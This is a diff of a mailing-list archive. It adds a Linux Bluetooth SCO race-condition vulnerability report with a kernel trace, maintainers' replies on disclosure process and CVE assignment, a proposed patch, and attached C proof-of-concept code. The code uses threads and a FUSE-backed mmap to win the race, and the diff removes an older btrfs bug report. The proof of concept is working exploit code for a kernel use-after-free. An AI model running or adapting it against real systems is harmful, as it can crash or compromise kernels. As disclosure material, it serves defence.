+> [ 1084.909141]  ? report_bug+0x288/0x310
+> [ 1084.909145]  ? vprintk_default+0x1d/0x30
+> [ 1084.909149]  ? handle_bug+0x9f/0xd0
+> [ 1084.909153]  ? exc_invalid_op+0x18/0x50
+> [ 1084.909158]  ? asm_exc_invalid_op+0x1b/0x20
+> [ 1084.909164]  ? refcount_warn_saturate+0x13e/0x1a0
+> [ 1084.909168]  sco_conn_del+0x1dc/0x220
+> [ 1084.909174]  sco_connect_cfm+0x1d4/0xac0
+> [ 1084.909179]  ? __pfx_sco_connect_cfm+0x10/0x10
+> [ 1084.909184]  ? __pfx_mutex_lock+0x10/0x10
+> [ 1084.909189]  hci_sco_setup+0x397/0x570
+> [ 1084.909193]  ? __pfx_hci_sco_setup+0x10/0x10
+> [ 1084.909196]  ? __pfx_mutex_lock+0x10/0x10
+> [ 1084.909202]  hci_conn_complete_evt+0x957/0x1150
+> [ 1084.909206]  ? kasan_save_track+0x14/0x40
+> [ 1084.909211]  ? __pfx_hci_conn_complete_evt+0x10/0x10
+> [ 1084.909215]  ? __kasan_check_write+0x14/0x30
+> [ 1084.909220]  ? mutex_unlock+0x81/0xe0
+> [ 1084.909224]  ? __pfx_mutex_unlock+0x10/0x10
+> [ 1084.909228]  hci_event_packet+0x818/0x1080
+> [ 1084.909256]  ? __pfx_hci_conn_complete_evt+0x10/0x10
+> [ 1084.909261]  ? __pfx_hci_event_packet+0x10/0x10
+> [ 1084.909267]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
+> [ 1084.909272]  ? __pfx_hci_cmd_sync_complete+0x10/0x10
+> [ 1084.909278]  ? __kasan_check_read+0x11/0x20
+> [ 1084.909285]  hci_rx_work+0x312/0xd60
+> [ 1084.909291]  ? __pfx__raw_spin_lock_irq+0x10/0x10
+> [ 1084.909297]  process_one_work+0x577/0xd30
+> [ 1084.909301]  ? _raw_spin_lock_irq+0x8b/0x100
+> [ 1084.909308]  worker_thread+0x879/0x15a0
+> [ 1084.909312]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
+> [ 1084.909319]  ? __pfx_worker_thread+0x10/0x10
+> [ 1084.909323]  kthread+0x2b7/0x390
+> [ 1084.909328]  ? __pfx_kthread+0x10/0x10
+> [ 1084.909350]  ret_from_fork+0x44/0x90
+> [ 1084.909354]  ? __pfx_kthread+0x10/0x10
+> [ 1084.909359]  ret_from_fork_asm+0x1b/0x30
+> [ 1084.909364]  </TASK>
+> [ 1084.909366] ---[ end trace 0000000000000000 ]---
+> 
+> =*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*=
+> Environment =*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*=
+> 
+> linux-6.8.0
+> ubuntu 24.04
+> .config: https://github.com/qiutianshu/sco-race-condition/blob/main/config
+> 
+> =*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*=
+> Proof of Concept
+> =*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*=
+> 
+> https://github.com/qiutianshu/sco-race-condition/blob/main/Linux-6.8.0-PoC.webm
+> 
+> =*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*=
+> PATCH =*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*=
+> 
+> My patch removes the three "lock-release" pairs in the original
+> sco_sock_connect, and use a single "lock-release" pair to protect the
+> whole connect procedure.
+> Circular locking have not been observed after patching:
+> https://github.com/qiutianshu/sco-race-condition/blob/main/test.c
+> 
+> Patch:
+> https://github.com/qiutianshu/sco-race-condition/blob/main/diff.txt
+
+The replies originally included some quoting of the message above, which
+I excluded from the copies below.
+
+On Thu, Nov 14, 2024 at 07:51:20PM +0100, Vegard Nossum wrote:
+> Hi tianshu,
+> 
+> Thank you for the report.
+> 
+> At a glance, 483bc08181827fc475643272ffb69c533007e546 looks like it was
+> only committed in 6.9 yet your crash/kernel messages indicate you are
+> testing against 6.8.0 -- are you sure this wasn't fixed already? Could
+> you verify with a more recent kernel?
+> 
+> Secondly, have you contacted either security@kernel.org or the bluetooth
+> maintainers about this issue? The maintainers would be:
+> 
+> BLUETOOTH SUBSYSTEM
+> M:      Marcel Holtmann <marcel@holtmann.org>
+> M:      Johan Hedberg <johan.hedberg@gmail.com>
+> M:      Luiz Augusto von Dentz <luiz.dentz@gmail.com>
+> 
+> Please see the kernel documentation on reporting security issues:
+> 
+> https://docs.kernel.org/process/security-bugs.html
+> 
+> For CVE assignments, you need to contact the CVE assignment team:
+> 
+> https://docs.kernel.org/process/cve.html
+> 
+> However, be aware that CVE-2024-27398 was already assigned to the issue
+> fixed by commit 483bc08181827fc475643272ffb69c533007e546 ("Bluetooth:
+> Fix use-after-free bugs caused by sco_sock_timeout") -- which, if it's
+> the same issue, would also be the same CVE.
+> 
+> I admit I haven't looked very closely at the code yet, I will try to
+> take a better look tomorrow. (Anybody else on the list is obviously
+> welcome to look as well.)
+> 
+> Finally, I will point out that we usually require reporters to set an
+> embargo end-date according to the linux-distros list policy (usually 7
+> days, no more than 14 days), after which your report must also be made
+> public by posting it to oss-security; see:
+> 
+> https://oss-security.openwall.org/wiki/mailing-lists/distros#list-policy-and-instructions-for-reporters
+> 
+> Thanks,
+> 
+> Vegard
+
+On Mon, Nov 18, 2024 at 09:33:27PM +0100, Salvatore Bonaccorso wrote:
+> Hi,
+> 
+> Question back on your report: have you reached out first to the kernel
+> security team?
+> 
+> Cf. https://oss-security.openwall.org/wiki/mailing-lists/distros#list-policy-and-instructions-for-reporters
+> 
+> | Please consider notifying upstream projects/developers of the affected
+> | software, other affected distro vendors, and/or affected Open Source
+> | projects before notifying one of these mailing lists in order to
+> | readily have fixes for the distributions to apply and to ensure that
+> | these other parties are OK with the maximum embargo period that would
+> | apply (if not, you may delay your notification to the mailing list).
+> | For Linux kernel issues, you must notify the kernel security team
+> | first, wait for the fix, and only then notify linux-distros or
+> | oss-security (depending on whether the information is still private or
+> | already public, as well as on issue severity).
+> 
 > Regards,
->   butt3rflyh4ck.
->
->
->
-> On Wed, Aug 25, 2021 at 10:49 AM butt3rflyh4ck
-> <butterflyhuangxx@gmail.com> wrote:
-> >
-> > Hello, there is a null pointer dereference bug in the btrfs_rm_device
-> > function in fs/btrfs/volumes.c in linux-5.14.0-rc4+ and reproduce too.
-> > Fortunately, triggering the bug requires =E2=80=98CAP_SYS_ADMIN=E2=80=
-=99.
-> >
-> > #Root Cause
-> > When a user invokes a BTRFS_IOC_RM_DEV_V2 ioctl to remove a non-exist
-> > volume device,
-> > it would call btrfs_ioctl_rm_dev_v2 function to implement. And
-> > btrfs_ioctl_rm_dev_v2 would call btrfs_rm_device,
-> > if the id of the volume device is illegal, it would trigger a
-> > null-ptr-deref bug to cause DoS.
-> >
-> > # Analyse
-> > https://lore.kernel.org/linux-btrfs/CAFcO6XO5TC5sEo-C9JGC75JkNAzkOSSLA3=
-a=3DbwQqXFFbRTZ7Gw@mail.gmail.com/T/#md4b850f33616b7364f86e6fed144abc925f36=
-69c
-> >
-> > #Fix
-> > the patch for this issue, not available upstream now.
-> > https://lore.kernel.org/linux-btrfs/20210806102415.304717-1-wqu@suse.co=
-m/T/#u
-> >
-> >
-> > #Timeline
-> > *2021/8/6 - Vulnerability reported to maintainer and CC to
-> > linux-btrfs@vger.kernel.org.
-> > *2021/8/6 - Vulnerability confirmed and patched.
-> > *2021/8/10 - Vulnerability reported to secalert@redhat.com.
-> > *2021/8/25 - Opened on oss-security@lists.openwall.com.
-> >
-> > #Credit
-> > the issue is reported by Active Defense Lab of Venustech.
-> >
-> > Regards,
-> >  butt3rflyh4ck.
-> > --
-> > Active Defense Lab of Venustech
->
->
->
-> --
-> Active Defense Lab of Venustech
+> Salvatore
 
+--M9NhX3UHpAaciwkO
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: attachment; filename="diff.txt"
 
+--- net/bluetooth/sco.c	2024-03-11 04:38:09
++++ ../sco.c	2024-11-13 22:35:49
+@@ -277,7 +277,6 @@
+ 		goto unlock;
+ 	}
+ 
+-	lock_sock(sk);
+ 
+ 	err = sco_chan_add(conn, sk, NULL);
+ 	if (err) {
+@@ -296,7 +295,6 @@
+ 		sco_sock_set_timer(sk, sk->sk_sndtimeo);
+ 	}
+ 
+-	release_sock(sk);
+ 
+ unlock:
+ 	hci_dev_unlock(hdev);
+@@ -576,23 +574,23 @@
+ 	if (alen < sizeof(struct sockaddr_sco) ||
+ 	    addr->sa_family != AF_BLUETOOTH)
+ 		return -EINVAL;
+-
+-	if (sk->sk_state != BT_OPEN && sk->sk_state != BT_BOUND)
++	
++	lock_sock(sk);
++	if (sk->sk_state != BT_OPEN && sk->sk_state != BT_BOUND){
++		release_sock(sk);
+ 		return -EBADFD;
++	}
+ 
+ 	if (sk->sk_type != SOCK_SEQPACKET)
+ 		err = -EINVAL;
+-
+-	lock_sock(sk);
++	
+ 	/* Set destination address and psm */
+ 	bacpy(&sco_pi(sk)->dst, &sa->sco_bdaddr);
+-	release_sock(sk);
+ 
+ 	err = sco_connect(sk);
+ 	if (err)
+ 		return err;
+ 
+-	lock_sock(sk);
+ 
+ 	err = bt_sock_wait_state(sk, BT_CONNECTED,
+ 				 sock_sndtimeo(sk, flags & O_NONBLOCK));
 
---=20
-Active Defense Lab of Venustech
+--M9NhX3UHpAaciwkO
+Content-Type: text/x-c; charset=us-ascii
+Content-Disposition: attachment; filename="test.c"
+
+#define _GNU_SOURCE             /* See feature_test_macros(7) */
+#include <sched.h>
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <errno.h>
+#include <pthread.h>
+#include <bluetooth/bluetooth.h>
+#include <bluetooth/sco.h>
+
+#define NR_SETSOCKOPT_TH	2
+
+int fd;
+pthread_barrier_t setsockopt_barrier;
+
+void *connect1(void *arg){
+	struct sockaddr_sco sa;
+	int i, ret;
+	for(i = 0; i < 6; i++)
+		sa.sco_bdaddr.b[i] = 0;
+	sa.sco_family = AF_BLUETOOTH;
+	ret = pthread_barrier_wait(&setsockopt_barrier);
+	if (ret != 0 && ret != PTHREAD_BARRIER_SERIAL_THREAD) {
+		printf("pthread_barrier_wait in connect1\n");
+		return NULL;
+	}
+	connect(fd, (struct sockaddr *)&sa, sizeof(sa));
+}
+
+void *connect2(void *arg){
+	struct sockaddr_sco sa;
+	int i, ret;
+	for(i = 0; i < 6; i++)
+		sa.sco_bdaddr.b[i] = 0xff;
+	sa.sco_family = AF_BLUETOOTH;
+	ret = pthread_barrier_wait(&setsockopt_barrier);
+	if (ret != 0 && ret != PTHREAD_BARRIER_SERIAL_THREAD) {
+		printf("pthread_barrier_wait in connect1\n");
+		return NULL;
+	}
+	connect(fd, (struct sockaddr *)&sa, sizeof(sa));
+}
+
+void race(){
+	pthread_t t2, t3;
+
+	fd = socket(AF_BLUETOOTH, SOCK_SEQPACKET | SOCK_NONBLOCK , BTPROTO_SCO);
+        if(fd < 0){
+                perror("create sco socket failed\n");
+                exit(-1);
+        }
+
+	if(pthread_barrier_init(&setsockopt_barrier, NULL, NR_SETSOCKOPT_TH) != 0){
+		printf("pthread_barrier_init setsockopt failed\n");
+		exit(-1);
+	}
+
+	pthread_create(&t2, NULL, connect1, NULL);
+	pthread_create(&t3, NULL, connect2, NULL);
+
+	pthread_join(t2, NULL);
+	pthread_join(t3, NULL);
+
+	close(fd);
+}
+
+int main(){
+	int i = 0;
+
+	while(1){
+		printf("round %d\n", i++);
+		race();	
+	}
+
+	return 0;
+}
+
+--M9NhX3UHpAaciwkO
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: attachment; filename=Makefile
+
+all: poc.c fake_fuse.c fake_fuse.h
+	gcc -o poc poc.c fake_fuse.c `pkg-config fuse --cflags --libs` -D_FILE_OFFSET_BITS=64 -g
+clean:
+	rm poc
+
+--M9NhX3UHpAaciwkO
+Content-Type: text/x-c; charset=us-ascii
+Content-Disposition: attachment; filename="poc.c"
+
+#define _GNU_SOURCE             /* See feature_test_macros(7) */
+#include <sched.h>
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <errno.h>
+#include <pthread.h>
+#include <bluetooth/bluetooth.h>
+#include <bluetooth/sco.h>
+#include "fake_fuse.h"
+
+int fd;
+void *evil_page;
+char *fargs_evil[] = {"poc", "evil", NULL };
+static struct fuse_operations ops = {
+        .read = evil_read,
+        .readdir = evil_readdir,
+        .getattr = evil_getattr,
+};
+
+int nr_cpus, current_cpu = 0;
+
+void *connect1(void *arg){
+	struct sockaddr_sco sa;
+	int i;
+	for(i = 0; i < 6; i++)
+		sa.sco_bdaddr.b[i] = 0;
+	sa.sco_family = AF_BLUETOOTH;
+	connect(fd, (struct sockaddr *)&sa, sizeof(sa));
+}
+
+void *connect2(void *arg){
+	struct sockaddr_sco sa;
+	int i;
+	for(i = 0; i < 6; i++)
+		sa.sco_bdaddr.b[i] = 0xff;
+	sa.sco_family = AF_BLUETOOTH;
+	connect(fd, (struct sockaddr *)&sa, sizeof(sa));
+}
+
+void *setsockopt_(void *arg){
+	void *value = arg;
+	setsockopt(fd, SOL_SCO, BT_PKT_STATUS, value, sizeof(int));		//acquire the lock_sock(sk)
+}
+
+int get_cpu_num(){
+	cpu_set_t mask;
+
+	if(sched_getaffinity(getpid(), sizeof(mask), &mask) != 0)
+		return -1;
+
+	return CPU_COUNT(&mask);
+}
+
+void do_prepare(){
+	int n = 0, ret, evil_fd;
+	unsigned long value;
+	unsigned long *fake_stack;
+
+	nr_cpus = get_cpu_num();
+	if(nr_cpus == -1){
+		perror("get cpu numbers failed\n");
+		exit(-1);
+	}
+	printf("CPU number: %d\n", nr_cpus);
+}
+
+void win_race(){
+	int lock_fd, key_fd;
+	void *value;
+	pthread_t t1, t2, t3;
+
+	fd = socket(AF_BLUETOOTH, SOCK_SEQPACKET | SOCK_NONBLOCK , BTPROTO_SCO);
+        if(fd < 0){
+                perror("create sco socket failed\n");
+                exit(-1);
+        }
+	
+	lock_fd = open("evil/lock", O_RDWR);
+	if(lock_fd < 0){
+		perror("open lock failed");
+		exit(-1);
+	}
+	
+	value = mmap((void *)0x1336000, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, lock_fd, 0);
+	if(value != (void *)0x1336000){
+		perror("mmap for lock_fd");
+		exit(-1);
+	}
+
+	
+	pthread_create(&t1, NULL, setsockopt_, value);
+	pthread_create(&t2, NULL, connect1, NULL);
+	pthread_create(&t3, NULL, connect2, NULL);
+
+	pthread_join(t1, NULL);
+	pthread_join(t2, NULL);
+	pthread_join(t3, NULL);
+	
+	munmap(value, 0x1000);
+	close(lock_fd);
+	close(fd);
+}
+
+int main(){
+	int i, ret;
+
+	mkdir(EVIL_PATH, 0777);
+	if(!fork())
+		fuse_main(2, fargs_evil, &ops, NULL);
+	else{
+		sleep(1);
+		do_prepare();
+		win_race();
+		return 0;
+	}	
+}
+
+--M9NhX3UHpAaciwkO
+Content-Type: text/x-c; charset=us-ascii
+Content-Disposition: attachment; filename="fake_fuse.c"
+
+#include "fake_fuse.h"
+
+const char *evil_path = "evil";
+const char *lock_acq = "lock";
+const char *conn_lock = "conn";
+int fuse_pipes[2];
+
+int evil_read(const char *path, char *buf, size_t size, off_t offset,
+              struct fuse_file_info *fi)
+{
+    char signal;
+    char evil_buffer[0x1000];
+    size_t len = 0x1000;
+
+    memset(evil_buffer, 'a', 0x1000);
+    if(strcmp(path + 1, lock_acq) == 0){
+	printf("setsockopt lock\n");
+        memcpy(buf, lock_acq, 4);
+        sleep(2);
+        return size;
+    }
+    
+    if(strcmp(path + 1, conn_lock) == 0){
+	printf("connect locked\n");
+        int i;
+	for(i = 0; i < 6; i++)
+		buf[i] = 0xff;
+
+//	sleep(5);
+        return size;
+    }
+
+    if (strcmp(path + 1, evil_path) == 0)
+    {
+        if(offset >= len)
+            return 0;
+        if(offset + size > len)
+            size = len - offset;
+        while (1){}
+        
+        memcpy(buf, evil_buffer + offset, size);
+        
+        read(fuse_pipes[0], &signal, 1);
+        return size;
+    }
+    return size;
+}
+
+int evil_getattr(const char *path, struct stat *stbuf)
+{
+    int res = 0;
+
+    memset(stbuf, 0, sizeof(struct stat));
+
+    if (strcmp(path, "/") == 0)
+    {
+        stbuf->st_mode = S_IFDIR | 0755;
+        stbuf->st_nlink = 2;
+    }
+    else if (strcmp(path + 1, evil_path) == 0)
+    {
+        stbuf->st_mode = S_IFREG | 0666;
+        stbuf->st_nlink = 1;
+        stbuf->st_size = 0x1000;
+    }
+    else if (strcmp(path + 1, lock_acq) == 0)
+    {
+        stbuf->st_mode = S_IFREG | 0666;
+        stbuf->st_nlink = 1;
+        stbuf->st_size = 0x1000;
+    }
+    else if (strcmp(path + 1, conn_lock) == 0)
+    {
+        stbuf->st_mode = S_IFREG | 0666;
+        stbuf->st_nlink = 1;
+        stbuf->st_size = 0x1000;
+    }
+    else
+    {
+        res = -ENOENT;
+    }
+
+    return res;
+}
+
+int evil_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
+             off_t offset, struct fuse_file_info *fi)
+{
+    if (strcmp(path, "/") != 0)
+        return -ENOENT;
+
+    filler(buf, ".", NULL, 0);
+    filler(buf, "..", NULL, 0);
+    filler(buf, evil_path, NULL, 0);
+    filler(buf, lock_acq, NULL, 0);
+    filler(buf, conn_lock, NULL, 0);
+    return 0;
+}
+
+--M9NhX3UHpAaciwkO
+Content-Type: text/x-c; charset=us-ascii
+Content-Disposition: attachment; filename="fake_fuse.h"
+
+#define FUSE_USE_VERSION	30
+#include <fcntl.h>
+#include <fuse.h>
+#include <sys/stat.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <stdatomic.h>
+#include <unistd.h>
+#include <string.h>
+#include <errno.h>
+#include <sys/types.h>
+
+#define EVIL_PATH   "evil"
+extern int fuse_pipes[2];
+
+int evil_read(const char *path, char *buf, size_t size, off_t offset,
+              struct fuse_file_info *fi);
+
+int evil_getattr(const char *path, struct stat *stbuf);
+
+int evil_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
+             off_t offset, struct fuse_file_info *fi);
+--M9NhX3UHpAaciwkO--
